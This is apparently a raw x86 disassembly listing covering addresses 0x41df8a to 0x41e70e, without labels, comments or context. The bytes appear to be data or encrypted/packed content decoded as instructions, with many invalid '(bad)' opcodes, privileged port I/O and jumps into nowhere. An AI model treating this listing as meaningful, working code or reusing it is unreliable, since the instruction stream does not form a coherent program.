  41df8a:	inc    esp
  41df8b:	lar    esp,WORD PTR [ecx+0x38]
  41df8f:	xor    ch,BYTE PTR [edi]
  41df91:	push   esi
  41df92:	xchg   esp,eax
  41df93:	in     al,0x53
  41df95:	data16 mov bh,0x90
  41df98:	inc    esp
  41df99:	das    
  41df9a:	inc    esp
  41df9b:	adc    eax,0x2f66d8be
  41dfa0:	test   eax,0xd94eab0e
  41dfa5:	das    
  41dfa6:	mov    edx,0x629d6fcb
  41dfab:	or     eax,0x8473339f
  41dfb0:	aam    0x28
  41dfb2:	jae    0x41df50
  41dfb4:	sub    BYTE PTR [edx+0x63],ah
  41dfb7:	fadd   st(7),st
  41dfb9:	pop    ebx
  41dfba:	das    
  41dfbb:	inc    ecx
  41dfbc:	jp     0x41e001
  41dfbe:	push   ds
  41dfbf:	mov    esi,0xaabd7627
  41dfc4:	lds    ebp,FWORD PTR [ecx-0x69]
  41dfc7:	into   
  41dfc8:	jecxz  0x41dfa5
  41dfca:	xchg   BYTE PTR [ebx],cl
  41dfcc:	fwait
  41dfcd:	push   0x21
  41dfcf:	cmp    eax,DWORD PTR [ecx-0x77]
  41dfd2:	rcr    DWORD PTR [eax],0x56
  41dfd5:	adc    BYTE PTR [ebp+0x6f],bh
  41dfd8:	retf   
  41dfd9:	pavgb  mm6,QWORD PTR ds:0xe0b28709
  41dfe0:	jl     0x41dfdb
  41dfe2:	push   es
  41dfe3:	leave  
  41dfe4:	(bad)  
  41dfe5:	cmp    BYTE PTR ds:0x4494356e,al
  41dfeb:	push   edx
  41dfec:	bound  eax,QWORD PTR [ebx]
  41dfee:	and    edx,DWORD PTR [ecx-0x17]
  41dff1:	push   cs
  41dff2:	call   0x72618690
  41dff7:	fcomp  QWORD PTR [esi]
  41dff9:	dec    esp
  41dffa:	or     BYTE PTR [esi-0x441963de],dl
  41e000:	mov    WORD PTR [esp+edx*2-0x62],ss
  41e004:	mov    dh,0x2f
  41e006:	cli    
  41e007:	daa    
  41e008:	xchg   ecx,eax
  41e009:	js     0x41e002
  41e00b:	leave  
  41e00c:	mov    dl,0x8d
  41e00e:	mov    dh,0xe3
  41e010:	xchg   edi,eax
  41e011:	xor    esp,DWORD PTR [ebp+0x9]
  41e014:	jmp    DWORD PTR [edi+0x49]
  41e017:	xor    dh,BYTE PTR [eax]
  41e019:	push   0xc66811e8
  41e01e:	and    eax,0x96b3219
  41e023:	clc    
  41e024:	cli    
  41e025:	inc    eax
  41e026:	sub    ecx,DWORD PTR [ebx]
  41e028:	fs jbe 0x41dfb8
  41e02b:	jecxz  0x41e00a
  41e02d:	push   es
  41e02e:	xchg   ebp,eax
  41e02f:	jno    0x41e040
  41e031:	dec    edi
  41e032:	jmp    0x41e07c
  41e034:	lock cli 
  41e036:	and    DWORD PTR [esi-0x1394031b],ecx
  41e03c:	push   edx
  41e03d:	or     BYTE PTR [edi+0x12],dh
  41e040:	or     DWORD PTR [ebx-0x4e],esp
  41e043:	cs mov bh,0xc2
  41e046:	dec    ebx
  41e047:	xchg   esi,eax
  41e048:	jle    0x41e024
  41e04a:	mov    esp,0x1487c0fd
  41e04f:	test   DWORD PTR [ecx],ecx
  41e051:	inc    ebp
  41e052:	push   eax
  41e053:	xchg   esp,eax
  41e054:	emms   
  41e056:	push   ebx
  41e057:	dec    ebp
  41e058:	ss xor BYTE PTR gs:[ecx+0x51],0x38
  41e05e:	mov    esi,0xd85e1fbe
  41e063:	aad    0x77
  41e065:	pushf  
  41e066:	in     eax,dx
  41e067:	adc    DWORD PTR [ebx+eiz*1],ecx
  41e06a:	pop    es
  41e06b:	lods   eax,DWORD PTR ds:[esi]
  41e06c:	pop    eax
  41e06d:	sbb    al,0xba
  41e06f:	pop    esi
  41e070:	retf   0xc905
  41e073:	test   eax,0x4e643fea
  41e078:	cdq    
  41e079:	add    eax,0xdb09edeb
  41e07e:	mov    ebp,edi
  41e080:	aaa    
  41e081:	jp     0x41e00d
  41e083:	lds    ecx,FWORD PTR [eax]
  41e085:	dec    esi
  41e086:	mov    ?,WORD PTR [edi+0x117e383a]
  41e08c:	sub    al,0xe8
  41e08e:	mov    dh,0x4d
  41e090:	ins    DWORD PTR es:[edi],dx
  41e091:	in     al,dx
  41e092:	(bad)  
  41e093:	aam    0xfe
  41e095:	in     eax,dx
  41e096:	mov    esi,0x2eee7f1
  41e09b:	call   0x627f:0x34456da4
  41e0a2:	fwait
  41e0a3:	jle    0x71d40528
  41e0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0aa:	adc    bh,cl
  41e0ac:	dec    edi
  41e0ad:	or     al,0x81
  41e0af:	mov    ebx,0x4a7fd3a4
  41e0b4:	mov    al,0x1b
  41e0b6:	mov    ah,0xcd
  41e0b8:	inc    esi
  41e0b9:	mov    al,ds:0xe7b020e0
  41e0be:	jne    0x41e0f9
  41e0c0:	into   
  41e0c1:	mov    ecx,0x55e35bc7
  41e0c6:	adc    ah,BYTE PTR [edi]
  41e0c8:	sub    DWORD PTR [ecx+ecx*4-0xfd23716],esp
  41e0cf:	mov    ebx,0x3a9b00da
  41e0d4:	pop    ebx
  41e0d5:	cmp    al,0x98
  41e0d7:	xor    eax,0xc40e4328
  41e0dc:	stos   DWORD PTR es:[edi],eax
  41e0dd:	fst    st(3)
  41e0df:	or     esp,DWORD PTR [ebx*4-0x36964536]
  41e0e6:	addr16 cs mov ebx,0x75e986de
  41e0ed:	adc    BYTE PTR [eax+eax*8],cl
  41e0f0:	stos   DWORD PTR es:[edi],eax
  41e0f1:	ror    BYTE PTR ds:0x3447ce83,cl
  41e0f7:	in     eax,dx
  41e0f8:	mov    dl,0xbb
  41e0fa:	int3   
  41e0fb:	pop    edx
  41e0fc:	add    eax,ecx
  41e0fe:	js     0x41e145
  41e100:	out    dx,al
  41e101:	rep repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e104:	popa   
  41e105:	clc    
  41e106:	iret   
  41e107:	enter  0xebaf,0x88
  41e10b:	adc    ebx,DWORD PTR [edi-0x3d45c6ec]
  41e111:	cwde   
  41e112:	sub    al,0x54
  41e114:	in     eax,0x7f
  41e116:	or     ebp,DWORD PTR [ecx]
  41e118:	test   BYTE PTR [ecx],dl
  41e11a:	mov    bl,0xc
  41e11c:	test   eax,0xb633c989
  41e121:	or     al,0x7c
  41e123:	inc    edx
  41e124:	call   0x3a25:0xa8f73f6
  41e12b:	adc    ch,BYTE PTR [edi+0x3c11617c]
  41e131:	xchg   esp,eax
  41e132:	xchg   esp,eax
  41e133:	in     al,0xad
  41e135:	cli    
  41e136:	adc    BYTE PTR [edi+esi*1-0x64],al
  41e13a:	jle    0x41e155
  41e13c:	adc    BYTE PTR [ebp+0x51],dl
  41e13f:	inc    ebp
  41e140:	xchg   ecx,eax
  41e141:	in     eax,0xff
  41e143:	cmp    al,0xa1
  41e145:	ret    0x530d
  41e148:	pop    esp
  41e149:	scas   eax,DWORD PTR es:[edi]
  41e14a:	outs   dx,DWORD PTR ds:[esi]
  41e14b:	jge    0x41e157
  41e14d:	mov    bl,0x97
  41e14f:	mov    DWORD PTR [ecx-0x67],esi
  41e152:	adc    eax,0x2906312d
  41e157:	or     eax,0x52ca7bc3
  41e15c:	fdivrp st(1),st
  41e15e:	sub    al,0x64
  41e160:	and    BYTE PTR [edx],ch
  41e162:	pushf  
  41e163:	mov    ds:0x29cd4d36,al
  41e168:	shr    BYTE PTR [edi+0x1b],1
  41e16b:	pop    esi
  41e16c:	into   
  41e16d:	scas   al,BYTE PTR es:[edi]
  41e16e:	leave  
  41e16f:	bound  eax,QWORD PTR [edi]
  41e171:	cmp    DWORD PTR [edi],0xd34d9cca
  41e177:	push   es
  41e178:	pop    edi
  41e179:	in     al,0xea
  41e17b:	mov    eax,eax
  41e17d:	cmp    al,0x87
  41e17f:	adc    esp,DWORD PTR [edi+ebx*1-0x625a5912]
  41e186:	fdivrp st(3),st
  41e188:	mov    esp,0x553e7351
  41e18d:	(bad)  
  41e18f:	jae    0x41e186
  41e191:	sar    BYTE PTR [ecx],0xb7
  41e194:	xor    ch,cl
  41e196:	in     al,dx
  41e197:	xchg   BYTE PTR [eax+0x66680365],ch
  41e19d:	xchg   ebp,eax
  41e19e:	inc    ecx
  41e19f:	inc    edi
  41e1a0:	sub    esp,DWORD PTR [ebp+0x4e5d5f45]
  41e1a6:	imul   edx,DWORD PTR [edx],0xa11c6d53
  41e1ac:	mov    ax,ds:0xd9bc4b44
  41e1b2:	cmc    
  41e1b3:	jl     0x41e21e
  41e1b5:	dec    esi
  41e1b6:	(bad)  
  41e1b7:	cmp    BYTE PTR ds:0x843fb97a,cl
  41e1bd:	xor    edi,DWORD PTR [edx-0x16]
  41e1c0:	pop    ds
  41e1c1:	pop    ebp
  41e1c2:	ret    
  41e1c3:	lods   eax,DWORD PTR ds:[esi]
  41e1c4:	js     0x41e211
  41e1c6:	dec    esi
  41e1c7:	rol    DWORD PTR ds:0xadafc0c2,1
  41e1cd:	jp     0x41e1ac
  41e1cf:	(bad)  
  41e1d0:	not    BYTE PTR [esi+ebx*4-0x10]
  41e1d4:	xchg   ecx,eax
  41e1d5:	in     al,0x74
  41e1d7:	xchg   ebp,eax
  41e1d8:	scas   eax,DWORD PTR es:[edi]
  41e1d9:	ror    esp,cl
  41e1db:	mov    edi,0x158570ae
  41e1e0:	shl    DWORD PTR [edi-0x7b],0x75
  41e1e4:	pop    ebx
  41e1e5:	and    al,0x54
  41e1e7:	mov    bh,0x19
  41e1e9:	pushf  
  41e1ea:	int3   
  41e1eb:	xchg   ebx,eax
  41e1ec:	neg    BYTE PTR [eax]
  41e1ee:	aad    0x7d
  41e1f0:	fs test eax,0x7139046
  41e1f6:	rcr    BYTE PTR [edx],0x9b
  41e1f9:	js     0x41e1f9
  41e1fb:	ret    0x8bc3
  41e1fe:	pop    ebx
  41e1ff:	add    al,0xae
  41e201:	sub    eax,0x776ed2e5
  41e206:	mov    cl,0xef
  41e208:	aaa    
  41e209:	js     0x41e1c0
  41e20b:	cwde   
  41e20c:	xor    DWORD PTR [edi-0x2763b811],0x5170e447
  41e216:	imul   edx,ebx,0x51cb2ced
  41e21c:	fimul  WORD PTR [esi+edi*4]
  41e21f:	xchg   ecx,eax
  41e220:	jae    0x41e210
  41e222:	scas   al,BYTE PTR es:[edi]
  41e223:	scas   eax,DWORD PTR es:[edi]
  41e224:	sbb    dh,BYTE PTR [edx-0x4fd3cd73]
  41e22a:	not    BYTE PTR [esp+esi*1-0x12]
  41e22e:	call   0x4e02e5e1
  41e233:	sbb    bh,0x3e
  41e236:	pop    ebp
  41e237:	or     ch,BYTE PTR [eax+0x7f124ea]
  41e23d:	cmp    esp,ebx
  41e23f:	pop    ebx
  41e240:	fbstp  TBYTE PTR [eax+0x6983db46]
  41e246:	add    ebp,DWORD PTR [edi-0x19ffaf91]
  41e24c:	sub    eax,0x3a1702ac
  41e251:	jae    0x41e284
  41e253:	jecxz  0x41e208
  41e255:	sub    dl,BYTE PTR es:[esi+0xf451ea5]
  41e25c:	and    al,BYTE PTR ds:0x47c3b8a1
  41e262:	out    0x72,al
  41e264:	push   ebx
  41e265:	dec    ecx
  41e266:	jae    0x41e24a
  41e268:	(bad)  
  41e269:	jle    0x41e217
  41e26b:	or     BYTE PTR [edi-0x508bab87],0x7a
  41e272:	scas   eax,DWORD PTR es:[edi]
  41e273:	cwde   
  41e274:	js     0x41e2be
  41e276:	arpl   WORD PTR [ecx-0x63],dx
  41e279:	jp     0x41e2cf
  41e27b:	and    ebx,DWORD PTR [ebx]
  41e27d:	sub    eax,0xb1dced5f
  41e282:	punpckhwd mm5,QWORD PTR [esp+edx*2+0x38]
  41e287:	xor    al,0x97
  41e289:	push   ebp
  41e28a:	jae    0x41e2a5
  41e28c:	xor    DWORD PTR [eax+eiz*2],edx
  41e28f:	and    DWORD PTR [ebp-0x66],edx
  41e292:	pushf  
  41e293:	rcr    BYTE PTR [edx],0x89
  41e296:	or     BYTE PTR [ebp+0x74],ch
  41e299:	mov    ecx,0xfab9a121
  41e29e:	add    DWORD PTR [esi],0x97bc9c97
  41e2a4:	jmp    DWORD PTR [esi+0x560286a3]
  41e2aa:	cmp    DWORD PTR [ecx],0x3c
  41e2ad:	bswap  esi
  41e2af:	clc    
  41e2b0:	sahf   
  41e2b1:	lock push ds
  41e2b3:	or     DWORD PTR [esi-0x68],ebx
  41e2b6:	loopne 0x41e2f8
  41e2b8:	jne    0x41e300
  41e2ba:	dec    eax
  41e2bb:	arpl   bx,bp
  41e2bd:	stos   BYTE PTR es:[edi],al
  41e2be:	loopne 0x41e2a1
  41e2c0:	arpl   WORD PTR [esi],sp
  41e2c2:	not    DWORD PTR [edi]
  41e2c4:	jmp    0xcbd137f4
  41e2c9:	lods   al,BYTE PTR ds:[esi]
  41e2ca:	inc    DWORD PTR [edi-0x4409561f]
  41e2d0:	adc    al,0x21
  41e2d2:	int    0xec
  41e2d4:	xor    cl,BYTE PTR [edx]
  41e2d6:	(bad)  
  41e2d7:	nop
  41e2d8:	jbe    0x41e2fd
  41e2da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2db:	(bad)  
  41e2dc:	xlat   BYTE PTR ds:[ebx]
  41e2dd:	lea    edx,[edx]
  41e2df:	mov    ah,0xbd
  41e2e1:	jle    0x41e35e
  41e2e3:	in     eax,0x1a
  41e2e5:	push   ebp
  41e2e6:	out    dx,eax
  41e2e7:	push   0xc93ecd47
  41e2ec:	cli    
  41e2ed:	dec    ebx
  41e2ee:	int3   
  41e2ef:	xor    DWORD PTR [ecx+0x50],edi
  41e2f2:	jbe    0x41e319
  41e2f4:	sbb    esi,DWORD PTR [esp+eax*4-0x12]
  41e2f8:	pop    ecx
  41e2f9:	adc    eax,0xe638dc60
  41e2fe:	sub    DWORD PTR [edx],ecx
  41e300:	jecxz  0x41e353
  41e302:	clc    
  41e303:	(bad)  
  41e304:	test   al,0x3a
  41e307:	push   0x43
  41e309:	and    eax,0xf2508ace
  41e30e:	xchg   edx,eax
  41e30f:	in     eax,0xe0
  41e311:	mov    edx,0x55af77a0
  41e316:	fwait
  41e317:	jecxz  0x41e2b8
  41e319:	scas   al,BYTE PTR es:[edi]
  41e31a:	pusha  
  41e31b:	xor    eax,0x9dfbea2f
  41e320:	sbb    ecx,DWORD PTR [ecx]
  41e322:	push   0x1fa50383
  41e327:	retf   
  41e328:	ret    0x743
  41e32b:	cmp    DWORD PTR [ecx+0x6f2f6083],ecx
  41e331:	aad    0x67
  41e333:	adc    dl,al
  41e335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e336:	mov    ecx,0xb3ee3b22
  41e33b:	jle    0x41e3a7
  41e33d:	pusha  
  41e33e:	sub    BYTE PTR [ecx+0x52],ch
  41e341:	xor    bh,ch
  41e343:	mov    ebp,eax
  41e345:	sbb    DWORD PTR [ebx],edi
  41e347:	test   eax,esp
  41e349:	(bad)  
  41e34a:	xor    DWORD PTR [esi-0x39],ebp
  41e34d:	btr    DWORD PTR [esi+0x3c14b1e8],edi
  41e354:	mov    DWORD PTR [eax],edi
  41e356:	pop    ebx
  41e357:	cs jp  0x41e353
  41e35a:	mov    ebx,0x51ce2bee
  41e35f:	sub    eax,0xfcde7f3
  41e364:	mov    esp,0xc7b1ba0c
  41e369:	jno    0x41e303
  41e36b:	pop    eax
  41e36c:	dec    eax
  41e36d:	add    BYTE PTR [ebx-0x27],bl
  41e370:	jp     0x41e3af
  41e372:	test   eax,eax
  41e374:	or     eax,0x5f13329c
  41e379:	ins    BYTE PTR es:[edi],dx
  41e37a:	lahf   
  41e37b:	sbb    bh,BYTE PTR [esi-0x50]
  41e37e:	mov    WORD PTR [edx],es
  41e380:	adc    esp,edi
  41e382:	ror    BYTE PTR [ecx-0x119e9f4c],cl
  41e388:	out    0x5d,eax
  41e38a:	fst    QWORD PTR [ebp+ebp*8+0x7737169f]
  41e391:	cmp    al,0x84
  41e393:	push   ebx
  41e394:	loopne 0x41e3c1
  41e396:	pop    esp
  41e397:	imul   ecx,DWORD PTR [edi-0x58589a34],0x22
  41e39e:	dec    esi
  41e39f:	sub    eax,0x78ddf4dd
  41e3a4:	leave  
  41e3a5:	rol    BYTE PTR [eax+0x46],0xa3
  41e3a9:	jo     0x41e36d
  41e3ab:	stos   DWORD PTR es:[edi],eax
  41e3ac:	cmp    DWORD PTR ds:0x5dc712cb,ebx
  41e3b2:	out    0xdd,eax
  41e3b4:	push   ecx
  41e3b5:	mov    ebx,0x4c232127
  41e3ba:	jl     0x41e429
  41e3bc:	add    dl,BYTE PTR [esi+ebx*4-0x31]
  41e3c0:	int    0xd
  41e3c2:	pop    ss
  41e3c3:	mov    ch,0x91
  41e3c5:	mov    dh,0x1c
  41e3c7:	arpl   WORD PTR [ecx+0xab6904c],sp
  41e3cd:	repz repz mov esi,DWORD PTR [ebx+ebx*2]
  41e3d2:	int3   
  41e3d3:	add    dl,BYTE PTR [ebx]
  41e3d5:	js     0x41e442
  41e3d7:	and    al,0xb8
  41e3d9:	idiv   DWORD PTR [edx-0x50f0b6ec]
  41e3df:	inc    ecx
  41e3e0:	addr16 aaa 
  41e3e2:	pop    ebx
  41e3e3:	loopne 0x41e3f7
  41e3e5:	retf   0xd1e0
  41e3e8:	call   0x5823:0x37eee0e2
  41e3ef:	imul   edx,DWORD PTR [esi+0xe],0xadfabff5
  41e3f6:	sar    BYTE PTR [esi-0x79a67f8b],cl
  41e3fc:	lahf   
  41e3fd:	sub    ebx,DWORD PTR [ebp+0x7b]
  41e400:	fwait
  41e401:	mov    WORD PTR [ebx+0x4f09ac36],ds
  41e407:	popf   
  41e408:	mov    eax,ds:0xe76c1d88
  41e40d:	and    al,0x19
  41e40f:	lds    edx,FWORD PTR [ecx]
  41e411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e412:	pop    ebp
  41e413:	dec    ecx
  41e414:	(bad)  
  41e415:	jp     0x41e492
  41e417:	jp     0x41e39f
  41e419:	call   0x50370cb3
  41e41e:	gs mov cl,0xdf
  41e421:	jp     0x41e460
  41e423:	jp     0x41e3da
  41e425:	sbb    al,0xb5
  41e427:	push   edx
  41e428:	ins    BYTE PTR es:[edi],dx
  41e429:	lods   al,BYTE PTR ds:[esi]
  41e42a:	(bad)  
  41e42b:	pop    esi
  41e42c:	or     al,0x4e
  41e42e:	je     0x41e411
  41e430:	leave  
  41e431:	xor    al,0x60
  41e433:	sbb    al,BYTE PTR [ebx+0x7d]
  41e436:	retf   0x7a05
  41e439:	xor    al,cl
  41e43b:	ret    
  41e43c:	cmp    eax,0x33100a06
  41e441:	dec    ebp
  41e442:	and    BYTE PTR [edx],0xdd
  41e445:	bound  edx,QWORD PTR [eax]
  41e447:	sub    dh,dh
  41e449:	ret    0x1f40
  41e44c:	pop    edi
  41e44d:	retf   0xefad
  41e450:	pop    ebp
  41e451:	mov    dl,0xb7
  41e453:	mov    dh,al
  41e455:	(bad)
  41e458:	clc    
  41e459:	mov    esp,edi
  41e45b:	test   ebx,ebx
  41e45d:	jb     0x41e458
  41e45f:	(bad)  
  41e460:	mov    ebx,0x86b5d7a2
  41e465:	cmp    edi,DWORD PTR [ebx]
  41e467:	mov    ch,BYTE PTR [ebp+edx*8-0x6b689b63]
  41e46e:	test   eax,0x568912b8
  41e473:	out    dx,eax
  41e474:	sti    
  41e475:	jmp    0x41e474
  41e477:	jo     0x41e48d
  41e479:	and    eax,0x8b9de4e8
  41e47e:	adc    eax,0xc6e09b5e
  41e483:	fisub  DWORD PTR [ebx+0x4a88cdb8]
  41e489:	test   DWORD PTR [esi],eax
  41e48b:	push   ds
  41e48c:	sub    eax,0xdf510f59
  41e491:	dec    esp
  41e492:	gs pop ebp
  41e494:	(bad)  
  41e495:	mov    edi,0x718a6e16
  41e49a:	retf   0x30f1
  41e49d:	(bad)  
  41e49e:	fcomp  QWORD PTR [ebx-0x69]
  41e4a1:	xchg   edi,eax
  41e4a2:	dec    edi
  41e4a3:	sbb    edx,esp
  41e4a5:	cmp    ebx,ecx
  41e4a7:	mov    ?,esi
  41e4a9:	push   0x6c
  41e4ab:	sar    BYTE PTR [edi-0x2b],1
  41e4ae:	enter  0x39d9,0xa4
  41e4b2:	add    BYTE PTR [ecx],bh
  41e4b4:	loop   0x41e4fb
  41e4b6:	xor    al,0xd1
  41e4b8:	xchg   edi,eax
  41e4b9:	cmp    ah,dl
  41e4bb:	add    al,0x7
  41e4bd:	(bad)  
  41e4be:	adc    esp,DWORD PTR [esi+0x3b6c1f73]
  41e4c4:	lods   al,BYTE PTR ds:[esi]
  41e4c5:	adc    bh,ah
  41e4c7:	cmc    
  41e4c8:	mov    cl,0xfd
  41e4ca:	xor    BYTE PTR [eax],bh
  41e4cc:	rol    BYTE PTR [ecx],0xde
  41e4cf:	xchg   edx,eax
  41e4d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4d1:	fmul   QWORD PTR [eax]
  41e4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4d4:	addr16 or al,0x59
  41e4d7:	xlat   BYTE PTR ds:[ebx]
  41e4d8:	fcomip st,st(2)
  41e4da:	mov    WORD PTR [ebx+0x623ba7d6],?
  41e4e0:	cmp    ebx,DWORD PTR [ecx-0x21986494]
  41e4e6:	mov    dh,0x8f
  41e4e8:	mov    ds:0xa72f34e3,al
  41e4ed:	ins    DWORD PTR es:[edi],dx
  41e4ee:	nop
  41e4ef:	or     DWORD PTR [esi-0x58],edi
  41e4f2:	idiv   edx
  41e4f4:	xchg   esp,eax
  41e4f5:	push   ebx
  41e4f6:	jno    0x41e4a2
  41e4f8:	adc    eax,DWORD PTR [edi+esi*4-0x1]
  41e4fc:	sar    BYTE PTR [ebx+0x66],0xdb
  41e500:	add    DWORD PTR [ecx],0xdc7a857a
  41e506:	fadd   QWORD PTR [eax-0x2331855b]
  41e50c:	inc    esi
  41e50d:	mov    al,ds:0x7c40ac7c
  41e512:	or     ch,al
  41e514:	mov    esi,0xf14ea2a7
  41e519:	pop    edx
  41e51a:	aam    0x8c
  41e51c:	scas   eax,DWORD PTR es:[edi]
  41e51d:	pop    es
  41e51e:	test   edi,ebx
  41e520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e521:	jmp    0x4bbd:0xa0db7810
  41e528:	sbb    DWORD PTR [ebx],ebx
  41e52a:	jmp    0xb7dc5e3d
  41e52f:	sub    eax,0xb43ae107
  41e534:	dec    edi
  41e535:	xor    DWORD PTR [ebp+0x2f],0x686c4494
  41e53c:	ret    
  41e53d:	(bad)  
  41e53e:	enter  0x8582,0x12
  41e542:	cld    
  41e543:	(bad)  
  41e545:	stos   BYTE PTR es:[edi],al
  41e546:	xchg   esi,eax
  41e547:	cmp    eax,ebp
  41e549:	inc    edx
  41e54a:	pop    ss
  41e54b:	mov    eax,ds:0x4d4a8096
  41e550:	cmp    eax,0x3ea2e0e0
  41e555:	sub    BYTE PTR [ebx-0x728a65b6],0xef
  41e55c:	push   eax
  41e55d:	adc    BYTE PTR [ebx-0x35],cl
  41e560:	test   al,0xad
  41e562:	pop    edi
  41e563:	test   edx,ecx
  41e565:	mov    esi,0xa12b4215
  41e56a:	dec    ebp
  41e56b:	test   BYTE PTR [edx+0x1c18aea7],ah
  41e571:	out    dx,eax
  41e572:	xor    bh,BYTE PTR [ebp+0x72edaad4]
  41e578:	or     DWORD PTR [eax-0x80],eax
  41e57b:	int    0x85
  41e57d:	(bad)  
  41e57e:	jne    0x41e5e9
  41e580:	(bad)  
  41e581:	xchg   edx,eax
  41e582:	sbb    DWORD PTR [ebx+0x5822ddd0],ebx
  41e588:	adc    eax,0x756f3fe7
  41e58d:	shl    BYTE PTR [edi-0x1ad5184e],cl
  41e593:	pop    esi
  41e594:	icebp  
  41e595:	xor    al,0x40
  41e597:	iret   
  41e598:	pop    esp
  41e599:	mov    gs,WORD PTR [edx+0x58]
  41e59c:	les    edx,FWORD PTR [esi+0x65]
  41e59f:	out    dx,al
  41e5a0:	mov    bh,0xaa
  41e5a2:	adc    bl,BYTE PTR [edi+edi*1-0x20]
  41e5a6:	xor    ch,bl
  41e5a8:	out    dx,al
  41e5a9:	imul   ebp,eax,0xfe9e964f
  41e5af:	ret    0x4328
  41e5b2:	add    BYTE PTR [edx],ch
  41e5b4:	push   0x72
  41e5b6:	xchg   esp,eax
  41e5b7:	arpl   cx,bx
  41e5b9:	into   
  41e5ba:	sar    DWORD PTR [eax-0xbe93f5c],0x87
  41e5c1:	jl     0x41e565
  41e5c3:	inc    ebx
  41e5c4:	add    edx,ecx
  41e5c6:	imul   esi,esi,0x7c2aaf98
  41e5cc:	and    eax,0xf2d45237
  41e5d1:	xlat   BYTE PTR ds:[ebx]
  41e5d2:	mov    ch,0x46
  41e5d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5d5:	mov    esi,0xc7561951
  41e5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5db:	scas   al,BYTE PTR es:[edi]
  41e5dc:	sub    ecx,DWORD PTR [ebx+ebp*1-0x7b]
  41e5e0:	dec    eax
  41e5e1:	in     al,dx
  41e5e2:	pusha  
  41e5e3:	sbb    ecx,DWORD PTR [ecx]
  41e5e5:	call   0xa56e33e2
  41e5ea:	retf   
  41e5eb:	mov    cl,0xee
  41e5ed:	sahf   
  41e5ee:	dec    esp
  41e5ef:	add    eax,0x285701aa
  41e5f4:	cmp    DWORD PTR [eax+ebp*1-0x5f],ebp
  41e5f8:	(bad)  
  41e5f9:	fadd   st,st(2)
  41e5fb:	fist   WORD PTR [ebx-0x45]
  41e5fe:	mov    ecx,0xb6c4e45d
  41e603:	inc    esi
  41e604:	ret    0x2209
  41e607:	test   DWORD PTR [esi-0x3ea11eb6],edx
  41e60d:	jae    0x41e678
  41e60f:	inc    edx
  41e610:	aas    
  41e611:	aam    0x3a
  41e613:	adc    bh,BYTE PTR [edx+0x69c47d1b]
  41e619:	fld    DWORD PTR [eax+edi*8-0x63ae2160]
  41e620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e621:	mov    BYTE PTR [edx-0x21a9361c],ch
  41e627:	xchg   ebx,eax
  41e628:	and    ah,BYTE PTR [edi+ebx*1-0x41]
  41e62c:	xor    DWORD PTR [ecx+esi*4+0x11],ebx
  41e630:	adc    eax,DWORD PTR [eax-0x70aa2eb7]
  41e636:	jns    0x41e68d
  41e638:	xor    DWORD PTR [edx-0x4b3c9e38],ecx
  41e63e:	pop    ds
  41e63f:	xchg   ebp,eax
  41e640:	pop    edx
  41e641:	adc    edx,DWORD PTR [esi-0x4c]
  41e644:	add    ch,BYTE PTR [ebx]
  41e646:	les    eax,FWORD PTR [eax+eiz*2]
  41e649:	in     eax,dx
  41e64a:	icebp  
  41e64b:	dec    edx
  41e64c:	adc    eax,0xdd52679d
  41e651:	clc    
  41e652:	sub    al,0x17
  41e654:	lock outs dx,BYTE PTR ds:[esi]
  41e656:	(bad)  
  41e658:	in     al,0x4c
  41e65a:	lds    ebx,FWORD PTR [ecx-0x352d3bdc]
  41e660:	in     al,0x97
  41e662:	div    edx
  41e664:	imul   ebx,DWORD PTR [ebp+0x53],0x34e1661b
  41e66b:	jne    0x41e6df
  41e66d:	in     eax,dx
  41e66e:	add    bl,BYTE PTR [ecx]
  41e670:	imul   ebx,DWORD PTR [ebx*8+0x757b5e],0x6f
  41e678:	xor    eax,0x6cb4c773
  41e67d:	idiv   DWORD PTR [edx+0x33b534c9]
  41e683:	gs push ss
  41e685:	and    esp,DWORD PTR [ecx-0xa]
  41e688:	and    BYTE PTR [ebp+0x20717a26],ah
  41e68e:	out    dx,al
  41e68f:	imul   ecx,esi,0xcd6bd6bb
  41e695:	or     BYTE PTR [edx+eax*8-0x4],bh
  41e699:	jg     0x41e6be
  41e69b:	fwait
  41e69c:	lods   al,BYTE PTR ds:[esi]
  41e69d:	shl    cl,cl
  41e69f:	pop    edi
  41e6a0:	lea    edx,[ecx-0x4d78c2dd]
  41e6a6:	out    0xb7,al
  41e6a8:	std    
  41e6a9:	jne    0x41e712
  41e6ab:	lods   eax,DWORD PTR ds:[esi]
  41e6ac:	jo     0x41e6f8
  41e6ae:	imul   edi,DWORD PTR [ecx-0x40],0xffffffe4
  41e6b2:	push   ss
  41e6b3:	sbb    edx,DWORD PTR [edi-0x2a88f041]
  41e6b9:	hlt    
  41e6ba:	dec    ebx
  41e6bb:	call   0x9f97:0x3e871a65
  41e6c2:	in     al,dx
  41e6c3:	fisttp DWORD PTR [ebx+0x1a700dec]
  41e6c9:	ret    
  41e6ca:	xchg   ecx,eax
  41e6cb:	jno    0x41e669
  41e6cd:	pop    ebx
  41e6ce:	sbb    dl,al
  41e6d0:	xchg   ecx,eax
  41e6d1:	sub    al,0x8b
  41e6d3:	rcl    DWORD PTR [esi+ecx*1+0x677f875],cl
  41e6da:	add    DWORD PTR [eax+ebx*8+0x57c6dc53],edx
  41e6e1:	in     al,dx
  41e6e2:	dec    esp
  41e6e3:	and    BYTE PTR [ebx],ch
  41e6e5:	adc    DWORD PTR [ecx+eax*4-0x3d],edi
  41e6e9:	jecxz  0x41e714
  41e6eb:	push   ebp
  41e6ec:	mov    eax,ds:0x972c5169
  41e6f1:	adc    eax,0xbdae5bf6
  41e6f6:	data16 int3 
  41e6f8:	(bad)  
  41e6f9:	cmc    
  41e6fa:	in     eax,0x59
  41e6fc:	pop    edx
  41e6fd:	test   al,0xa2
  41e6ff:	pop    eax
  41e700:	mov    dh,0x27
  41e702:	cs pusha 
  41e704:	mov    ecx,0xa6cacfde
  41e709:	fdiv   QWORD PTR [edx-0x4d]
  41e70c:	jge    0x41e788
  41e70e:	jle    0x41e6c2
